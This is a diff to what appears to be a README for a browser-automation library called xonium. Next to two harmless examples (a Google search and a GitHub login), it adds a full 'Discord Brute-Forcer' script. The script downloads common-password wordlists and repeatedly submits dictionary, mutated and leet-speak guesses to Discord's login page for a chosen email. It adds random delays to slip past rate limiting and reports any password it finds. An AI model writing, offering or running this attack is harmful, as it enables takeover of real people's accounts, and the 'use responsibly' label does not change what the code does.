@@ -4,7 +4,7 @@
 
 ### Example One = Google Search Automation
  
-import "xonium"
+```import "xonium"
 
 let drv = newsession("http://localhost:4444", {"browserName": "chrome"})
 
@@ -18,11 +18,11 @@ print("Found " + len(results) + " results")
 for i in range(min(5, len(results))) {
     print(results[i].gettext())
 }
-drv.close()
+drv.close()```
 
 ### Example Two = Github Login Automation
 
-import "xonium"
+```import "xonium"
 
 let drv = newsession("http://localhost:4444", {"browserName": "chrome"})
 
@@ -49,7 +49,275 @@ if drv.getcurrenturl() == "https://github.com/" {
         print("Error: " + error.gettext())
     }
 }
-drv.close()
+drv.close()```
+
+Example Three = Discord Brute-Forcer (Use Responsibly)
+```
+import "xonium"
+import "os"
+import "json"
+import "math"
+import "http"
+import "datetime"
+
+let lowercase = "abcdefghijklmnopqrstuvwxyz"
+let uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+let digits = "0123456789"
+let specials = "!@#$%^&*()_+-=[]{}|;:,.<>?"
+let allowedchars = lowercase + uppercase + digits + specials
+
+let wordlists = [
+    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt",
+    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
+    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt",
+    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-100-common-passwords.txt",
+    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt"
+]
+
+let randomdelay = fn(min, max) {
+    let delay = min + (max - min) * math.random()
+    sleep(delay)
+}
+
+let downloadwordlist = fn(url) {
+    let parts = url.split("/")
+    let filename = parts[len(parts) - 1]
+    if os.path.exists(filename) {
+        return filename
+    }
+    print("downloading " + filename + "...")
+    let content = http.get(url)
+    writefile(filename, content.body)
+    print("downloaded " + filename)
+    return filename
+}
+
+let loadwordlist = fn(url) {
+    let filename = downloadwordlist(url)
+    let content = readfile(filename)
+    let lines = content.split("\n")
+    let words = []
+    for line in lines {
+        let trimmed = line.strip()
+        if trimmed != "" and len(trimmed) >= 8 {
+            words.append(trimmed)
+        }
+    }
+    return words
+}
+
+let loadallwordlists = fn() {
+    let allwords = []
+    for url in wordlists {
+        print("loading wordlist...")
+        let words = loadwordlist(url)
+        allwords = allwords + words
+        print("loaded " + str(len(words)) + " words")
+    }
+    let unique = {}
+    let result = []
+    for word in allwords {
+        if not unique[word] {
+            unique[word] = true
+            result.append(word)
+        }
+    }
+    print("total unique words: " + str(len(result)))
+    return result
+}
+
+let trylogin = fn(drv, email, password) {
+    drv.get("https://discord.com/login")
+    randomdelay(0.5, 1)
+    let emailfield = xonium.waitfor(drv, "name", "email", 3)
+    emailfield.sendkeys(email)
+    randomdelay(0.3, 0.5)
+    let passfield = drv.findelement("name", "password")
+    passfield.sendkeys(password)
+    randomdelay(0.3, 0.5)
+    let loginbtn = drv.findelement("css selector", "button[type='submit']")
+    loginbtn.click()
+    randomdelay(1, 2)
+    let home = drv.findelement("css selector", "div[class*='container']")
+    if home {
+        return true
+    }
+    return false
+}
+
+let dictionaryattack = fn(email) {
+    let words = loadallwordlists()
+    print("total words to test: " + str(len(words)))
+    let drv = xonium.newsession("http://localhost:4444", {"browserName": "chrome", "headless": false})
+    let attempts = 0
+    let found = none
+    for word in words {
+        attempts = attempts + 1
+        if attempts % 100 == 0 {
+            print("attempt " + str(attempts) + "/" + str(len(words)) + ": " + word)
+        }
+        try {
+            let success = trylogin(drv, email, word)
+            if success {
+                found = word
+                print("password found: " + word)
+                print("attempts: " + str(attempts))
+                drv.close()
+                return found
+            }
+        } catch e {
+            // skip
+        }
+        if attempts % 500 == 0 {
+            randomdelay(2, 5)
+        }
+    }
+    drv.close()
+    print("password not found after " + str(attempts) + " attempts")
+    return none
+}
+
+let mutationattack = fn(email) {
+    let words = loadallwordlists()
+    let mutations = ["", "123", "!", "123!", "2024", "2025", "@", "#", "1", "!", "1234", "2023", "2022", "!!", "##", "@@", "12345", "123456"]
+    print("testing " + str(len(words)) + " words with " + str(len(mutations)) + " mutations")
+    let drv = xonium.newsession("http://localhost:4444", {"browserName": "chrome", "headless": false})
+    let attempts = 0
+    let found = none
+    for word in words[0:5000] {
+        for mutation in mutations {
+            let password = word + mutation
+            attempts = attempts + 1
+            if attempts % 100 == 0 {
+                print("attempt " + str(attempts) + ": " + password)
+            }
+            try {
+                let success = trylogin(drv, email, password)
+                if success {
+                    found = password
+                    print("password found: " + password)
+                    print("attempts: " + str(attempts))
+                    drv.close()
+                    return found
+                }
+            } catch e {
+                // skip
+            }
+            if attempts % 1000 == 0 {
+                randomdelay(2, 4)
+            }
+        }
+    }
+    drv.close()
+    print("password not found after " + str(attempts) + " attempts")
+    return none
+}
+
+let leetattack = fn(email) {
+    let leet = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$", "t": "7", "b": "8", "g": "9"}
+    let words = loadallwordlists()
+    print("generating leet variations for " + str(len(words)) + " words")
+    let drv = xonium.newsession("http://localhost:4444", {"browserName": "chrome", "headless": false})
+    let attempts = 0
+    let found = none
+    for word in words[0:1000] {
+        let variations = [word]
+        let leetword = word
+        for key in leet.keys() {
+            leetword = leetword.replace(key, leet[key])
+        }
+        if leetword != word {
+            variations.append(leetword)
+        }
+        if len(word) > 4 {
+            let upper = word.upper()
+            variations.append(upper)
+            let lower = word.lower()
+            variations.append(lower)
+            let capitalized = word[0].upper() + word[1:len(word)].lower()
+            variations.append(capitalized)
+        }
+        for variant in variations {
+            attempts = attempts + 1
+            if attempts % 100 == 0 {
+                print("attempt " + str(attempts) + ": " + variant)
+            }
+            try {
+                let success = trylogin(drv, email, variant)
+                if success {
+                    found = variant
+                    print("password found: " + variant)
+                    print("attempts: " + str(attempts))
+                    drv.close()
+                    return found
+                }
+            } catch e {
+                // skip
+            }
+            if attempts % 1000 == 0 {
+                randomdelay(2, 4)
+            }
+        }
+    }
+    drv.close()
+    print("password not found after " + str(attempts) + " attempts")
+    return none
+}
+
+let main = fn() {
+    print("=== DISCORD PASSWORD BRUTE FORCE ===")
+    print("enter discord email:")
+    let email = input("> ")
+    
+    print("\nselect attack mode:")
+    print("1. dictionary attack (all wordlists)")
+    print("2. mutation attack (dictionary + common suffixes)")
+    print("3. leet attack (leet speak variations)")
+    print("4. all attacks (sequential)")
+    print("5. exit")
+    
+    let choice = input("> ")
+    
+    if choice == "1" {
+        let result = dictionaryattack(email)
+        if result {
+            print("password: " + result)
+        }
+    } elif choice == "2" {
+        let result = mutationattack(email)
+        if result {
+            print("password: " + result)
+        }
+    } elif choice == "3" {
+        let result = leetattack(email)
+        if result {
+            print("password: " + result)
+        }
+    } elif choice == "4" {
+        print("starting all attacks...")
+        let result1 = dictionaryattack(email)
+        if result1 {
+            print("password found: " + result1)
+            return
+        }
+        let result2 = mutationattack(email)
+        if result2 {
+            print("password found: " + result2)
+            return
+        }
+        let result3 = leetattack(email)
+        if result3 {
+            print("password found: " + result3)
+            return
+        }
+        print("password not found in any attack")
+    } elif choice == "5" {
+        print("exiting...")
+        return
+    }
+}
+
+main()```
 
 ## Installation :
 axton install xonium
